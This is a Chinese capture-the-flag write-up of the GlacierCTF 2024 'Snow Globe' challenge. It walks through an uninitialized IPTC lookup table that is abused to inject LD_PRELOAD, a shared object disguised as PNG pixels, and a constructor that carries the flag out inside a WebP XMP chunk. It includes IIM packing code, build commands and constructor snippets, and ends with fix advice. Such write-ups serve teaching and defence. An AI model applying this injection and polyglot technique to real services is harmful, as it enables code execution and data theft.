# GlacierCTF 2024 Snow Globe

## 题目简述

Snow Globe 是把用户图片加工成动画 WebP 的 Flask 服务。处理链分为三段：

1. `extractor` 用 ImageMagick 解码图片为原始 RGB，并把 IPTC metadata 转成 `NAME=value` 文件；
2. `globe_wrapper` 读取这些变量，预先打开结果文件、安装 seccomp，再以该环境 `execve()` 执行 `snow_globe`；
3. `snow_globe` 生成动画并把 metadata 写入 XMP，Flask 最后验证结果确实是动画 WebP。

漏洞位于 IPTC record/dataset 到环境变量名的二维指针表：数组有 10 行，初始化循环却只清零前 9 行。借助上一阶段 `printf` 在栈上留下的用户指针，可以让 record 9 的未知 dataset 把攻击者指定的值解释成环境变量名，最终注入 `LD_PRELOAD`。再把共享对象伪装成图片的 RGB 像素，动态链接器就会在 seccomp 下加载它。

## 解题过程

### 1. 还原 metadata 到 execve 环境的边界

`globe_wrapper` 逐行接受只含字母、数字和下划线的变量名：

```c
size_t n = strspn(buf,
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_");
if (n == 0 || buf[n] != '=')
    continue;
```

读取结果直接成为 `execve(snow_globe, argv, new_env)` 的环境。`LD_PRELOAD=<path>` 因而是有效输入；动态链接器会在进入 `snow_globe` 的 `main` 前装载指定 ELF 并执行 constructor。

wrapper 在安装 seccomp 前已打开输出 WebP，并用 `fd:<number>` 传给下一阶段。题目进程中它稳定为 fd 3。seccomp 禁止以写模式再打开文件，却允许读 `openat`、`read`、`write`、`lseek`、`mmap` 和退出，因此 preload constructor 仍能读取 `/flag.png` 并把数据写进已经打开的 fd 3。

### 2. 利用未初始化的第 10 行注入变量名

源码定义：

```c
#define IIM_MAX_RECORD 9
#define IIM_MAX_DATASET 255

char *table[IIM_MAX_RECORD + 1][IIM_MAX_DATASET + 1];
for (size_t i = 0; i < IIM_MAX_RECORD; i++)
    memset(table[i], 0, sizeof(table[i]));
```

数组下标合法范围是 record 0–9，但循环条件 `i < 9` 只清零 0–8。合法的 record 9 因此会读取未初始化栈指针。

在进入 `parse_iptc_iim_data()` 前，`validate_iptc()` 会按顺序打印每条记录，格式参数包含当前记录数据的指针。题目固定二进制的栈帧复用使最后一次 `%.*s` 的数据指针残留在 `table[9][14]`。构造两条按 record 顺序合法的 IIM 记录：

```python
path = f"/tmp/snow_globe/intermediate_results/{job_id}.rgb"

entry1 = struct.pack(">BBBH", 0x1c, 9, 14, len(path)) + path.encode()
entry2 = struct.pack(">BBBH", 0x1c, 9, 23, len("LD_PRELOAD")) + b"LD_PRELOAD"
```

验证阶段最后处理 entry2，因此残留指针指向字符串 `LD_PRELOAD`。解析阶段先处理 entry1：

```c
env_name = table[9][14];       // 指向 "LD_PRELOAD"
fprintf(meta, "%s=%s\n", env_name, terminated_data);
```

最终 metadata 文件出现：

```text
LD_PRELOAD=/tmp/snow_globe/intermediate_results/<job_id>.rgb
```

entry2 自己解析出的无效变量行会被 wrapper 忽略，不影响第一行。Flask 表单中的 `job_id` 虽在正常页面里是 hidden input，客户端仍可自行提交；exploit 令它与 IPTC 中的路径完全一致。

### 3. 把共享对象编码进合法 PNG

上传不能直接是 `.so`，因为 `extractor` 会先要求 ImageMagick 成功解码。官方构建先用 `-nostdlib -shared -fPIC` 生成小型 `lib.so`，再补齐到 $256\times256\times3=196608$ 字节，并把这些字节逐字节解释成 8 位 RGB 像素：

```sh
gcc -nostdlib -shared -fPIC lib.c -o lib.so
fallocate -l $((256*256*3)) lib.so
convert -depth 8 -size 256x256 RGB:lib.so \
    -profile exploit.iptc exploit.png
```

`extractor` 将 `exploit.png` 再输出为 256×256 RGB 时，`<job_id>.rgb` 就恢复为以 ELF 开头、后面补零的共享对象。文件扩展名不影响动态链接器识别。

### 4. 在 constructor 中生成能通过检查的结果

直接把 flag 写到输出 fd 会被 Flask 的动画 WebP 检查拒绝。官方共享对象内嵌一个 1×1、2 帧的最小 WebP，并在 constructor 中：

1. 用裸 `openat/read/lseek` 系统调用读取 `/flag.png`；
2. 创建 `XMP ` chunk，chunk 内容直接放 flag PNG 字节，并按 RIFF 规则补齐偶数字节；
3. 增加 RIFF 文件长度，设置 VP8X header 的 XMP feature bit；
4. 向 fd 3 先写最小动画，再写 XMP chunk，关闭 fd 并 `_exit(0)`。

核心结构为：

```c
buf[0] = 'X'; buf[1] = 'M'; buf[2] = 'P'; buf[3] = ' ';
*(uint32_t *)(buf + 4) = flag_size;
read(flag_fd, buf + 8, flag_size);

*(uint32_t *)(mini_webp + 4) += padded_chunk_size;
mini_webp[0x14] |= 0b100;
write(3, mini_webp, mini_webp_len);
write(3, buf, padded_chunk_size);
```

constructor 在真正的 `snow_globe` 逻辑前退出，但结果已经是有效的两帧动画，因此服务返回 200 和下载路径。

### 5. 从 XMP chunk 恢复 flag

下载结果后执行：

```sh
exiftool -b -xmp result.webp > flag.png
```

XMP 内容不是规范 XML，而是原始 PNG，所以 exiftool 可能给格式警告，但 `-b` 仍会原样导出 chunk。图像中显示的文本与 `flag.txt` 一致：

```text
gctf{pwn1ng*1n*a*w1nt3r*w0nd3rland}
```

官方材料中的 man page、反编译、GDB 表格和 exploit 输出图片均已转写为上述变量语义、数组边界、残留指针位置和运行结果；最终 `flag.png` 也只是单行文字，没有额外视觉证据，因此本题不保留图片资源。

## 方法总结

完整利用是“IPTC 栈残留指针 → 任意环境变量名 → `LD_PRELOAD` → RGB/ELF polyglot → seccomp 内 constructor 执行 → 合法 WebP 的 XMP 数据外带”。seccomp 没有被绕过：攻击代码只使用策略本来允许的读取和向预开 fd 写入。修复应完整初始化二维表并同时验证 record/dataset 边界，禁止把图片 metadata 直接变成 `execve` 环境，执行子进程时使用固定 allowlist 环境，并确保动态链接器相关变量全部清除。
